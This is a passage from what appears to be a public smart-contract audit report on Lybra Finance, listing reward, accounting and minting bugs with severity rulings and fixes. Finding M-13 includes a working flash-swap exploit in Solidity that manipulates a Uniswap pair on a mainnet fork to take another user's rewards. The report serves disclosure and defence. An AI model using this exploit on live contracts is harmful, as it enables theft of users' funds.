When a user invokes the `ProtocolRewardsPool.getReward()` function, the contract attempts to distribute the rewards using the `EUSD` token:

[ProtocolRewardsPool.sol#L190-L218](https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/miner/ProtocolRewardsPool.sol#L190-L218)

```solidity
function getReward() external updateReward(msg.sender) {
    uint reward = rewards[msg.sender];
    if (reward > 0) {
        rewards[msg.sender] = 0;
        IEUSD EUSD = IEUSD(configurator.getEUSDAddress());
        uint256 balance = EUSD.sharesOf(address(this));
        uint256 eUSDShare = balance >= reward ? reward : reward - balance;
        EUSD.transferShares(msg.sender, eUSDShare);
        if (reward > eUSDShare) {
            ERC20 peUSD = ERC20(configurator.peUSD());
            uint256 peUSDBalance = peUSD.balanceOf(address(this));
            if (peUSDBalance >= reward - eUSDShare) {
                peUSD.transfer(msg.sender, reward - eUSDShare);
                emit ClaimReward(
                    msg.sender,
                    EUSD.getMintedEUSDByShares(eUSDShare),
                    address(peUSD),
                    reward - eUSDShare,
                    block.timestamp
                );
            } else {
                if (peUSDBalance > 0) {
                    peUSD.transfer(msg.sender, peUSDBalance);
                }
                ERC20 token = ERC20(configurator.stableToken());
                uint256 tokenAmount = ((reward - eUSDShare - peUSDBalance) *
                    token.decimals()) / 1e18;
                token.transfer(msg.sender, tokenAmount);
                emit ClaimReward(
                    msg.sender,
                    EUSD.getMintedEUSDByShares(eUSDShare),
                    address(token),
                    reward - eUSDShare,
                    block.timestamp
                );
            }
        } else {
            emit ClaimReward(
                msg.sender,
                EUSD.getMintedEUSDByShares(eUSDShare),
                address(0),
                0,
                block.timestamp
            );
        }
    }
}
```

To determine the available shares for rewarding users, the function calculates the shares of the eUSD token held by the contract and compares it with the total reward to be distributed.

Here is the code snippet illustrating this calculation:

```solidity
uint256 balance = EUSD.sharesOf(address(this));
uint256 eUSDShare = balance >= reward ? reward : reward - balance;
```

However, the comparison of shares with the reward in this manner is incorrect.

Let's consider an example to understand the problem. Suppose `rewards[msg.sender]` is equal to `$`10 worth of eUSD, and the shares held by the contract are 9 shares. If each share corresponds to `$`10 worth eUSD, the contract mistakenly assumes it does not have enough balance to cover the entire reward, because it has 9 shares; however, having 9 shares is equivalent to having `$`90 worth of eUSD. Consequently, it first sends 9 shares, equivalent to `$`90 worth of eUSD, and then sends `$`1 worth peUSD. However, the sum of these sent values is `$`91 worth of eUSD, while the user's actual reward is only `$`10 worth eUSD.

This issue can lead to incorrect reward distribution, causing users to receive significantly more or less rewards than they should.

### Tools Used

Manual Review

### Recommended Mitigation Steps

To address this issue, it is recommended to replace the usage of `eUSDShare` with `EUSD.getMintedEUSDByShares(eUSDShare)` in the following lines:

*   [ProtocolRewardsPool.sol#L198](https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/miner/ProtocolRewardsPool.sol#L198)
*   [ProtocolRewardsPool.sol#L201-L202](https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/miner/ProtocolRewardsPool.sol#L201-L202)
*   [ProtocolRewardsPool.sol#L209](https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/miner/ProtocolRewardsPool.sol#L209)

This ensures that the correct amount of eUSD is transferred to the user while maintaining the accuracy of reward calculations.

### Assessed type

Math

**[LybraFinance confirmed](https://github.com/code-423n4/2023-06-lybra-findings/issues/604#issuecomment-1635563567)**

**[0xean (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-06-lybra-findings/issues/604#issuecomment-1650698823):**
 > I will leave open for more comment, but this is probably more a "leak" of value type scenario than assets being lost or stolen directly. Therefore M is probably appropriate. 

***

## [[M-11] Understatement of `poolTotalPeUSDCirculation` amounts due to incorrect accounting after function `_repay` is called](https://github.com/code-423n4/2023-06-lybra-findings/issues/532)
*Submitted by [hl\_](https://github.com/code-423n4/2023-06-lybra-findings/issues/532), also found by [mahdikarimi](https://github.com/code-423n4/2023-06-lybra-findings/issues/984), [OMEN](https://github.com/code-423n4/2023-06-lybra-findings/issues/873), [DedOhWale](https://github.com/code-423n4/2023-06-lybra-findings/issues/854), [Toshii](https://github.com/code-423n4/2023-06-lybra-findings/issues/843), [Kenshin](https://github.com/code-423n4/2023-06-lybra-findings/issues/792), [RedOneN](https://github.com/code-423n4/2023-06-lybra-findings/issues/771), [kenta](https://github.com/code-423n4/2023-06-lybra-findings/issues/764), [Iurii3](https://github.com/code-423n4/2023-06-lybra-findings/issues/738), [mahdikarimi](https://github.com/code-423n4/2023-06-lybra-findings/issues/719), [cccz](https://github.com/code-423n4/2023-06-lybra-findings/issues/669), [gs8nrv](https://github.com/code-423n4/2023-06-lybra-findings/issues/579), [0xRobocop](https://github.com/code-423n4/2023-06-lybra-findings/issues/560), [hl\_](https://github.com/code-423n4/2023-06-lybra-findings/issues/529), [pep7siup](https://github.com/code-423n4/2023-06-lybra-findings/issues/452), [lanrebayode77](https://github.com/code-423n4/2023-06-lybra-findings/issues/426), [bytes032](https://github.com/code-423n4/2023-06-lybra-findings/issues/349), [Co0nan](https://github.com/code-423n4/2023-06-lybra-findings/issues/314), [SpicyMeatball](https://github.com/code-423n4/2023-06-lybra-findings/issues/300), [CrypticShepherd](https://github.com/code-423n4/2023-06-lybra-findings/issues/239), [Musaka](https://github.com/code-423n4/2023-06-lybra-findings/issues/222), [Vagner](https://github.com/code-423n4/2023-06-lybra-findings/issues/192), [Vagner](https://github.com/code-423n4/2023-06-lybra-findings/issues/191), [peanuts](https://github.com/code-423n4/2023-06-lybra-findings/issues/162), [0xRobocop](https://github.com/code-423n4/2023-06-lybra-findings/issues/146), [peanuts](https://github.com/code-423n4/2023-06-lybra-findings/issues/139), [peanuts](https://github.com/code-423n4/2023-06-lybra-findings/issues/138), and [max10afternoon](https://github.com/code-423n4/2023-06-lybra-findings/issues/132)*

Incorrect accounting of `poolTotalPeUSDCirculation`, results in an understatement of `poolTotalPeUSDCirculation` amounts. This causes inaccurate bookkeeping and in turn affects any other functions dependent on the use of `poolTotalPeUSDCirculation`.

### Proof of Concept

We look at function `_repay` of `LybraPeUSDVaultBase.sol` as [follows](https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/base/LybraPeUSDVaultBase.sol#L192-L210):

```solidity
 function _repay(address _provider, address _onBehalfOf, uint256 _amount) internal virtual {
     try configurator.refreshMintReward(_onBehalfOf) {} catch {}
     _updateFee(_onBehalfOf);
     uint256 totalFee = feeStored[_onBehalfOf];
     uint256 amount = borrowed[_onBehalfOf] + totalFee >= _amount ? _amount : borrowed[_onBehalfOf] + totalFee;
     if(amount >= totalFee) {
         feeStored[_onBehalfOf] = 0;
         PeUSD.transferFrom(_provider, address(configurator), totalFee);
         PeUSD.burn(_provider, amount - totalFee);
     } else {
         feeStored[_onBehalfOf] = totalFee - amount;
         PeUSD.transferFrom(_provider, address(configurator), amount);
     }
     try configurator.distributeRewards() {} catch {}
     borrowed[_onBehalfOf] -= amount;
     poolTotalPeUSDCirculation -= amount;


     emit Burn(_provider, _onBehalfOf, amount, block.timestamp);
 }
```

In particular, note the accounting of `poolTotalPeUSDCirculation` after repayment as [follows](https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/base/LybraPeUSDVaultBase.sol#L207):

```solidity
        poolTotalPeUSDCirculation -= amount;
```

Consider a scenario per below for user Alice, where:

- Amount borrowed = 200
- TotalFee = 2

| Repay Scenario (PeUSD)        |         |
| ----------------------------- | ------: |
| _amount input                 |     100 |
| totalFee                      |       2 |
| amount (repay)                |     100 |
| Fees left                     |       0 |
| PeUSD transfer to config addr |       2 |
| PeUSD burnt                   |      98 |
| borrowed[Alice]               |     100 |
| poolTotalPeUSDCirculation (X) | X - 100 |


Based on the accounting flow of the function, the fees incurred are transferred to `address(configurator)`.
The amount burned is `amount - totalFee`. However, we see that `poolTotalPeUSDCirculation` reduces the entire `amount` where it should be `amount - totalFee` reduced.

This results in an understatement of `poolTotalPeUSDCirculation` amounts.

### Tools Used

Manual review

### Recommended Mitigation Steps

Correct the accounting as follows:

```solidity
   -     poolTotalPeUSDCirculation -= amount;
   +     poolTotalPeUSDCirculation -= (amount - totalFee);
```

### Assessed type

Error

**[LybraFinance confirmed](https://github.com/code-423n4/2023-06-lybra-findings/issues/532#issuecomment-1639805030)**

***

## [[M-12] Rewards for initial period can be lost in all of the synthetix derivative contracts](https://github.com/code-423n4/2023-06-lybra-findings/issues/484)
*Submitted by [BugBusters](https://github.com/code-423n4/2023-06-lybra-findings/issues/484)*

### Lines of code

<https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/miner/stakerewardV2pool.sol#L132-L150> <br><https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/miner/ProtocolRewardsPool.sol#L227-L240> <br><https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/miner/EUSDMiningIncentives.sol#L226-L242>

### Impact

Rewards in the synthetix derivative contracts (`EUSDMinningIncentives.sol`, `ProtocolRewardsPool.sol` and `stakerRewardsV2Pool.sol`) are initiated when the owner calls the `notifyRewardAmount`. This function calculates the reward rate per second and also records the start of the reward period. This has an edge case where rewards are not counted for the initial period of time until there is at least one participant.

### Proof of Concept

Look at the code for `stakerrewardV2Pool.sol` (other files have somewhat similar logic too), derived from the synthetix:

```solidity
    function notifyRewardAmount(uint256 _amount) external onlyOwner updateReward(address(0)) {
        if (block.timestamp >= finishAt) {
            rewardRatio = _amount / duration;
        } else {
            uint256 remainingRewards = (finishAt - block.timestamp) * rewardRatio;
            rewardRatio = (_amount + remainingRewards) / duration;
        }

        require(rewardRatio > 0, "reward ratio = 0");

        finishAt = block.timestamp + duration;
        updatedAt = block.timestamp;
        emit NotifyRewardChanged(_amount, block.timestamp);
    }

    function _min(uint256 x, uint256 y) private pure returns (uint256) {
        return x <= y ? x : y;
    }
}
```

The intention here, is to calculate how many tokens should be rewarded by unit of time (second) and record the span of time for the reward cycle. However, this has an edge case where rewards are not counted for the initial period of time until there is at least one participant (in this case, a holder of `BathTokens`). During this initial period of time, the reward rate will still apply but as there isn't any participant, then no one will be able to claim these rewards and these rewards will be lost and stuck in the system.

This is a known vulnerability that has been covered before. The following reports can be used as a reference for the described issue:
- [0xMacro Blog - Synthetix Vulnerability](https://0xmacro.com/blog/synthetix-staking-rewards-issue-inefficient-reward-distribution/)
- [Same vulnerability in y2k report](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/93)

As described by the 0xmacro blogpost, this can play out as the following:

Let's consider that you have a `StakingRewards` contract with a reward duration of one month seconds (2592000):

Block N Timestamp = X

You call `notifyRewardAmount()` with a reward of one month seconds (2592000) only. The intention is for a period of a month, 1 reward token per second should be distributed to stakers.

- State :

    - `rewardRate` = 1
    - `periodFinish` = X + **2592000**

Block M Timestamp = X + Y

Y time has passed and the first staker stakes some amount:

1. `stake()`
2. `updateReward`<br>`rewardPerTokenStored` = 0<br>`lastUpdateTime` = X + Y

Hence, for this staker, the clock has started from X+Y, and they will accumulate rewards from this point.

Please note, that the `periodFinish` is X + `rewardsDuration`, not X + Y + `rewardsDuration`. Therefore, the contract will only distribute rewards until X + `rewardsDuration`, losing  Y &ast; `rewardRate` => Y &ast; 1  inside of the contract, as `rewardRate` = 1 (if we consider the above example).

Now, if we consider delay (Y) to be 30 minutes, then:

Only 2590200 (2592000-1800) tokens will be distributed and these 1800 tokens will remain unused in the contract until the next cycle of `notifyRewardAmount()`.

### Tools Used

Manual Review

### Recommended Mitigation Steps

A possible solution to the issue would be to set the start and end time for the current reward cycle when the first participant joins the reward program (i.e. when the total supply is greater than zero) instead of starting the process in the `notifyRewardAmount`.

**[0xean (judge) decreased severity to Medium](https://github.com/code-423n4/2023-06-lybra-findings/issues/484#issuecomment-1650715347)**

**[LybraFinance confirmed](https://github.com/code-423n4/2023-06-lybra-findings/issues/484#issuecomment-1653181697)**

***

## [[M-13] It is possible to manipulate WETH/LBR pair to claim reward of the users which shouldn't be claimed](https://github.com/code-423n4/2023-06-lybra-findings/issues/442)
*Submitted by [SpicyMeatball](https://github.com/code-423n4/2023-06-lybra-findings/issues/442), also found by [Kenshin](https://github.com/code-423n4/2023-06-lybra-findings/issues/788), [Brenzee](https://github.com/code-423n4/2023-06-lybra-findings/issues/431), and [Musaka](https://github.com/code-423n4/2023-06-lybra-findings/issues/256)*

Malicious user can manipulate balances of the WETH/LBR pair and bypass this check:

<https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/EUSDMiningIncentives.sol#L203>

Which allows them to steal rewards from a user who has staked enough LP and whose rewards shouldn't be claimable under normal circumstances.

`EUSDMiningIncentives.sol` is a staking contract which distributes rewards to users based on how much EUSD they have minted/borrowed. Rewards are accumulated over time and can be claimed only if a user has staked enough WETH/LBR uniswap pair LP tokens into another staking:

<https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/stakerewardV2pool.sol>

This condition is checked here:

<https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/EUSDMiningIncentives.sol#L188>

As we can see, `stakedLBRLpValue` of a user is calculated based on how much LP they have staked and the total cost of the tokens that are stored inside the WETH/LBR pair.

<https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/EUSDMiningIncentives.sol#L151-L156>

The total cost, however, is simply derived from the sum of the tokens balances, which we get with `balanceOf(pair)`.

This can be exploited:

1.  Alice minted some EUSD tokens.
2.  They also have staked LP tokens in the staking rewards contract.
3.  Currently `isOtherEarningsClaimable(alice)` returns false, that means they are safe.
4.  Bob wants to take Alice's rewards for themselves.
5.  They call a direct swap with WETH/LBR pair and chooses amounts that will lower the total cost of the LP.

        lbrInLp + etherInLp

6.  Then inside the callback Bob calls `purchaseOtherEarnings` and takes Alice's rewards.
7.  After that, Bob repays the loan.

### Proof of Concept

Custom test:
<details>


    // SPDX-License-Identifier: AGPL-3.0-only
    pragma solidity ^0.8.17;

    import {DSTestPlus} from "solmate/test/utils/DSTestPlus.sol";
    import {LybraStETHDepositVault as Vault} from "../contracts/lybra/pools/LybraStETHVault.sol";
    import {PeUSDMainnet as PeUSD} from "../contracts/lybra/token/PeUSDMainnetStableVision.sol";
    import {EUSD, IERC20} from "../contracts/lybra/token/EUSD.sol";
    import {Configurator} from "../contracts/lybra/configuration/LybraConfigurator.sol";
    import {EUSDMiningIncentives as Miner} from "../contracts/lybra/miner/EUSDMiningIncentives.sol";
    import {StakingRewardsV2} from "../contracts/lybra/miner/stakerewardV2pool.sol";
    import {esLBRBoost as Boost} from "../contracts/lybra/miner/esLBRBoost.sol";
    import {stETHMock} from "../contracts/mocks/stETHMock.sol";
    import {WstETH, IStETH} from "../contracts/mocks/mockWstETH.sol";
    import {mockCurve} from "../contracts/mocks/mockCurve.sol";
    import {mockEtherPriceOracle} from "../contracts/mocks/mockEtherPriceOracle.sol";
    import {mockLBRPriceOracle} from "../contracts/mocks/mockLBRPriceOracle.sol";

    import "forge-std/console.sol";
    import "forge-std/Test.sol";
    import "./FlashBorrower.sol";

    contract DAO {
        function checkRole(bytes32, address) external pure returns(bool) {
            return true;
        } 
        function checkOnlyRole(bytes32, address) external pure returns(bool) {
            return true;
        } 
    }

    contract Oracle {
        uint256 price;

        function setPrice(uint256 _price) external {
            price = _price;
        } 

        function fetchPrice() external view returns(uint256) {
            return price;
        } 
    }

    contract ESLBRMock {
        function mint(address, uint256) external returns(bool){
            return true;
        }
        function burn(address, uint256) external returns(bool){
            return true;
        }
    }

    contract LybraEUSDPoolTest is Test{
        Vault vault;
        PeUSD peusd;
        EUSD eusd;
        Configurator config;
        Boost boost;
        Miner miner;
        StakingRewardsV2 stakingReward;
        stETHMock stETH;
        WstETH wstETH;
        ESLBRMock eslbr;
        mockCurve curve;
        Oracle oracle;
        DAO dao;
        mockEtherPriceOracle ethOracle;
        mockLBRPriceOracle lbrOracle;
        address[] pools;

        address alice = makeAddr("alice");
        address bob = makeAddr("bob");
        IV2Router router;
        IV2Pair v2Pair; // WETH/LBR
        IWETH WETH;
        IERC20 LBR;

        function setUp() public {
            vm.createSelectFork(vm.envString("RPC_MAINNET_URL"), 17592869);
            router = IV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
            v2Pair = IV2Pair(0x061883CD8a060eF5B8d83cDe362C3Fdbd8162EeE);
            WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
            LBR = IERC20(0xF1182229B71E79E504b1d2bF076C15a277311e05);

            stETH = new stETHMock();
            wstETH = new WstETH(IStETH(address(stETH)));
            eslbr = new ESLBRMock();
            curve = new mockCurve();
            oracle = new Oracle();
            ethOracle = new mockEtherPriceOracle();
            lbrOracle = new mockLBRPriceOracle();
            dao = new DAO();
            config = new Configurator(address(dao), address(curve));
            eusd = new EUSD(address(config));
            peusd = new PeUSD(address(config), 18, makeAddr("LZ"));
            config.initToken(address(eusd), address(peusd));
            vault = new Vault(address(config), address(stETH), address(oracle));
            
            pools.push(address(vault));
            config.setMintVault(address(vault), true);
            oracle.setPrice(1800 * 1e18);

            boost = new Boost();
            miner = new Miner(address(config), address(boost), address(ethOracle), address(lbrOracle)); 
            stakingReward = new StakingRewardsV2(address(v2Pair), address(eslbr), address(boost));
            miner.setEthlbrStakeInfo(address(stakingReward), address(v2Pair));
            miner.setPools(pools);
            miner.setToken(address(LBR), address(eslbr));

            config.setMintVaultMaxSupply(address(vault), 10_000_000 * 1e18);
            config.setSafeCollateralRatio(address(vault), 160 * 1e18);
            config.setBadCollateralRatio(address(vault), 150 * 1e18);
            config.setEUSDMiningIncentives(address(miner));
            stETH.approve(address(vault), ~uint256(0));
            vm.deal(alice, 10 ether);
            stETH.transfer(alice, 500 ether);
        }

        function swapAndLiquify(address who, uint256 amount, address[] memory path) internal {
            // get WETH and LBR, purchase and stake LP tokens
            vm.startPrank(who);
            WETH.deposit{value: amount}();
            WETH.approve(address(router), ~uint256(0));
            LBR.approve(address(router), ~uint256(0));
            v2Pair.approve(address(stakingReward), ~uint256(0));
            router.swapExactTokensForTokens(amount/2, 0, path, who, block.timestamp);
            router.addLiquidity(address(WETH), address(LBR), amount/2, (amount * 1000)/2, 1, 1, who, block.timestamp);
            console.log(v2Pair.balanceOf(who));
            stakingReward.stake(v2Pair.balanceOf(who));
            vm.stopPrank();
        }

        function testFlashLoanAttack() public {
            uint256 mintAmount = 1800*60*1e18;

            address[] memory path = new address[](2);
            path[0] = address(WETH);
            path[1] = address(LBR);
            
            // PREP THE ATTACK
            // Alice has borrowed 540_000 EUSD and staked 126 LP tokens 
            vault.depositAssetToMint(100*1e18, mintAmount);
            swapAndLiquify(address(this), 0.8 ether, path);
            vm.startPrank(alice);
            stETH.approve(address(vault), ~uint256(0));
            vault.depositAssetToMint(500*1e18, mintAmount * 5);
            vm.stopPrank();
            swapAndLiquify(alice, 10 ether, path);

            assertEq(miner.isOtherEarningsClaimable(address(this)), true);
            assertEq(miner.isOtherEarningsClaimable(alice), false);
            
            // COMMENCE THE ATTACK
            FlashBorrower flashBorrower = new FlashBorrower(WETH, LBR, miner, stakingReward, v2Pair, router, alice);         
            WETH.approve(address(flashBorrower), ~uint256(0));
            LBR.approve(address(flashBorrower), ~uint256(0));
            // Get some tokens to repay flash swap fees
            WETH.deposit{value: 6 ether}();
            
            router.swapExactTokensForTokens(3 ether, 0, path, address(this), block.timestamp);
            WETH.transfer(address(flashBorrower), 1000);
            LBR.transfer(address(flashBorrower), 1000);
            // Drain tokens from the pair and manipulate {stakedLBRLpValue} to pass this check and claim rewards from the target
            // https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/EUSDMiningIncentives.sol#L193
            flashBorrower.flash(800 ether, 800000 ether);
        }
    }

`FlashBorrower` contract, notice the require check where we check if target user reward is claimable:

    // SPDX-License-Identifier: AGPL-3.0-only
    pragma solidity ^0.8.17;

    import {EUSDMiningIncentives as Miner} from "../contracts/lybra/miner/EUSDMiningIncentives.sol";
    import {StakingRewardsV2} from "../contracts/lybra/miner/stakerewardV2pool.sol";
    import {IERC20} from "../contracts/lybra/token/EUSD.sol";

    import "forge-std/console.sol";

    interface IV2Pair is IERC20 {
        function factory() external view returns(address);
        function swap(
            uint amount0Out,
            uint amount1Out,
            address to,
            bytes calldata data
        ) external;
    }

    interface IV2Router {
        function factory() external view returns(address);
        function swapExactTokensForTokens(
            uint amountIn,
            uint amountOutMin,
            address[] calldata path,
            address to,
            uint deadline
        ) external returns (uint[] memory amounts);
        function addLiquidity(
            address tokenA,
            address tokenB,
            uint amountADesired,
            uint amountBDesired,
            uint amountAMin,
            uint amountBMin,
            address to,
            uint deadline
        ) external returns (uint amountA, uint amountB, uint liquidity);
        function removeLiquidity(
            address tokenA,
            address tokenB,
            uint liquidity,
            uint amountAMin,
            uint amountBMin,
            address to,
            uint deadline
        ) external returns (uint amountA, uint amountB);
    }

    interface IWETH is IERC20 {
        function deposit() external payable;
        function withdraw(uint amount) external;
    }

    contract FlashBorrower {
        IWETH token0;
        IERC20 token1;
        Miner miner;
        StakingRewardsV2 staking;
        IV2Pair v2Pair;
        IV2Router v2Router;
        address target;

        constructor(
            IWETH _token0,
            IERC20 _token1,
            Miner _miner,
            StakingRewardsV2 _staking,
            IV2Pair _v2Pair,
            IV2Router _v2Router,
            address _target
        ) {
            token0 = _token0;
            token1 = _token1;
            miner = _miner;
            staking = _staking;
            v2Pair = _v2Pair;
            v2Router = _v2Router;
            target = _target;
            token0.approve(address(v2Router), ~uint256(0));
            token1.approve(address(v2Router), ~uint256(0));
            v2Pair.approve(address(v2Router), ~uint256(0));
        }

        function uniswapV2Call(
            address sender,
            uint256 amount0,
            uint256 amount1,
            bytes calldata data
        ) external {
            address caller = abi.decode(data, (address));

            require(miner.isOtherEarningsClaimable(target), "CAN'T GRAB TARGET'S REWARD");

            // Repay borrow
            uint256 fee0 = (amount0 * 3) / 997 + 1;
            uint256 fee1 = (amount1 * 3) / 997 + 1;
            uint256 amountToRepay0 = amount0 + fee0;
            uint256 amountToRepay1 = amount1 + fee1;

            // Transfer flash swap fee from caller
            token0.transferFrom(caller, address(this), fee0);
            token1.transferFrom(caller, address(this), fee1);

            // Repay
            token0.transfer(address(v2Pair), amountToRepay0);
            token1.transfer(address(v2Pair), amountToRepay1);
        }

        function flash(uint256 amount0, uint256 amount1) public {
            bytes memory data = abi.encode(msg.sender);
            v2Pair.swap(amount0, amount1, address(this), data);
        }
    }

</details>

### Tools Used
Forge. I forked the ETH mainnet at block `17592869`. Also, the following mainnet contracts were used:
- Uniswap V2 router (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D),
- WETH/LBR uniswap pair (0x061883CD8a060eF5B8d83cDe362C3Fdbd8162EeE),
- WETH token (0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2),
- LBR token (0xF1182229B71E79E504b1d2bF076C15a277311e05)

### Recommended Mitigation Steps

Use `ethlbrLpToken.getReserves()` instead of quoting balances directly with `balanceOf`

    (uint112 r0, uint112 r1, ) = ethlbrLpToken.getReserves()
    uint256 etherInLp = (r0 * uint(etherPrice)) / 1e8;
    uint256 lbrInLp = (r1 * uint(lbrPrice)) / 1e8;

### Assessed type

Uniswap

**[LybraFinance disputed and commented](https://github.com/code-423n4/2023-06-lybra-findings/issues/442#issuecomment-1635587856):**
 > The real price will be obtained through `Chainlink` oracles instead of the exchange rate in the LP. It will not be manipulated by flash loans.

**[0xean (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-06-lybra-findings/issues/442#issuecomment-1650718199):**
 > @LybraFinance - I think this qualifies as M. Are you suggesting that in the future the price will be pulled from `Chainlink`? If so, the wardens are reviewing the code base as written, not future changes to include a different price discovery mechanism and therefore I think this is valid. 

**[LybraFinance acknowledged](https://github.com/code-423n4/2023-06-lybra-findings/issues/442#issuecomment-1653123691)**

***

## [[M-14] No check for Individual mint amount surpassing 10% when the circulation reaches 10\_000\_000 in `mint()` of `LybraEUSDVaultBase` contract](https://github.com/code-423n4/2023-06-lybra-findings/issues/392)
*Submitted by [adeolu](https://github.com/code-423n4/2023-06-lybra-findings/issues/392)*

### Lines of code

<https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/base/LybraEUSDVaultBase.sol#L124> <br><https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/base/LybraEUSDVaultBase.sol#L126>

### Impact

The mint functions in `LybraEUSDVaultBase` have no checks for when the supplied amount to mint is more than 10% if circulation reaches 10,000,000, as specified in the comments explaining the logic of the function.

### Proof of Concept

Lets have a look at `mint()` code in the `LybraEUSDVaultBase` contract:

        /**
         * @notice The mint amount number of EUSD is minted to the address
         * Emits a `Mint` event.
         *
         * Requirements:
         * - `onBehalfOf` cannot be the zero address.
         * - `amount` Must be higher than 0. Individual mint amount shouldn't surpass 10% when the circulation 
              reaches 10_000_000
         */
        function mint(address onBehalfOf, uint256 amount) external {
            require(onBehalfOf != address(0), "MINT_TO_THE_ZERO_ADDRESS");
            require(amount > 0, "ZERO_MINT");
            _mintEUSD(msg.sender, onBehalfOf, amount, getAssetPrice());
        }

        function _mintEUSD(address _provider, address _onBehalfOf, uint256 _mintAmount, uint256 _assetPrice) internal virtual {
            require(poolTotalEUSDCirculation + _mintAmount <= configurator.mintVaultMaxSupply(address(this)), "ESL");
            try configurator.refreshMintReward(_provider) {} catch {}
            borrowed[_provider] += _mintAmount;

            EUSD.mint(_onBehalfOf, _mintAmount);
            _saveReport();
            poolTotalEUSDCirculation += _mintAmount;
            _checkHealth(_provider, _assetPrice);
            emit Mint(msg.sender, _onBehalfOf, _mintAmount, block.timestamp);
        }

From the code above, we can see there is no check prevent mint amount from being greater than 10% of 10,000,000 or more if the `poolTotalEUSDCirculation` is 10,000,000 or more as specified in the comments.

### Tools Used

VS CODE

### Recommended Mitigation Steps

Add checks to the `mint()` to revert if mint amount is greater than 10% of the total supply, if total supply is >= 10,000,000.

        function mint(address onBehalfOf, uint256 amount) external {
            require(onBehalfOf != address(0), "MINT_TO_THE_ZERO_ADDRESS");
            require(amount > 0, "ZERO_MINT");

            if ( poolTotalEUSDCirculation >= 10_000_000 ) {
             require(amount <= (10 * poolTotalEUSDCirculation) / 100, 'amount greater than 10% of circulation' );
            }
            _mintEUSD(msg.sender, onBehalfOf, amount, getAssetPrice());
        }

### Assessed type

Error

**[LybraFinance acknowledged](https://github.com/code-423n4/2023-06-lybra-findings/issues/392#issuecomment-1635590843)**

**[0xean (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-06-lybra-findings/issues/392#issuecomment-1650724520):**
 > @LybraFinance - this appears to be more of a M severity issue as it doesn't directly lead to assets being lost or stolen.

***

## [[M-15] Lack of timelock on `rigidRedemption`, enables to steal yield from other users](https://github.com/code-423n4/2023-06-lybra-findings/issues/290)
*Submitted by [max10afternoon](https://github.com/code-423n4/2023-06-lybra-findings/issues/290)*

The withdraw function of the `LybraEUSDVaultBase` vaults, uses a time softlock to prevent users from hopping in and out of the protocol; to gain access to the yield generated by other users and then leave right away (by charging a small percentage from the withdrawn amount).

The same measure isn't applied to `rigidRedemptions`, which enable a user to withdraw most of the underlying assets at any time after deposit. This enables a user to deposit into the pool right before a rebase is about to happen, get access to the yield generated by other users and leave by calling `rigidRedemption` and withdraw on the tokens left by `rigidRedemption` (the amount charged on the leftovers assets, can be outbalanced by the yield).

Therefore, a malicious user to get access to yield that they didn't generate, effectively stealing it from others. The amount that the user will get access to will vary based on the deposited amounts.

### Proof of Concept

This issue involves 3 functions:

- `withdraw(address onBehalfOf, uint256 amount)` from the `LybraEUSDVaultBase` [contract](https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/base/LybraEUSDVaultBase.sol#L98), which internally calls `checkWithdrawal(address user, uint256 amount)` to check that 3 days has passed after deposit and charges the user otherways:

    ```
    withdrawal = block.timestamp - 3 days >= depositedTime[user] ? amount : (amount * 999) / 1000;
    ```

- `rigidRedemption(address provider, uint256 eusdAmount)` from the `LybraEUSDVaultBase` [contract](<https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/base/LybraEUSDVaultBase.sol#L232>), which enables a user to withdraw the full borrowed amount getting back a 1:1 ratio of collateral (the rest will be left in the vault and can be withdrawn).
    ```    
    * @notice Choose a Redemption Provider, Rigid Redeem `eusdAmount` of EUSD and get 1:1 value of stETH
    * Emits a `RigidRedemption` event.
    ```

- `excessIncomeDistribution(uint256 stETHAmount)` from the `LybraStETHDepositVault` [contract](<https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/LybraStETHVault.sol#L62>), which enables anyone to buy the stETH, generated by lido to the vault (or by charging on withdraws and `rigidRedemptions`), for EUSD, allocating them to EUSD holders through rebasing.
    ```
    * @notice When stETH balance increases through LSD or other reasons, the excess income is sold for EUSD, allocated to EUSD holders through rebase mechanism.
    * Emits a `LSDValueCaptured` event.
    ```
Scenario:

1. Users use the protocol as intended depositing stETH which will generate a yield.
2. Bob calls the rebase mechanism (`excessIncomeDistribution`).
3. Alice sees the rebase and preceeds it with a deposit (either by frontruinng or by pure prediction, since stETH rebase happens daily at a fixed time).
